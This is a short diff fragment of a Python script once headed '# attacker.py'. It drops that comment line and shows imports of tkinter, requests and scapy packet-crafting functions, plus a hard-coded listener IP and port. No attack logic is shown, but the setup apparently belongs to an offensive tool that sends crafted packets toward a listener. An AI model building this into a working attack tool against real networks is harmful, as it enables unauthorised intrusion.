@@ -1,8 +1,8 @@
-# attacker.py
 import tkinter as tk
 import requests
 from scapy.all import send,sr1
 from scapy.layers.inet import IP,TCP,ICMP
+
 # Define the IP and port of the listener
 listener_ip = '192.168.0.14'
 listener_port = 5123
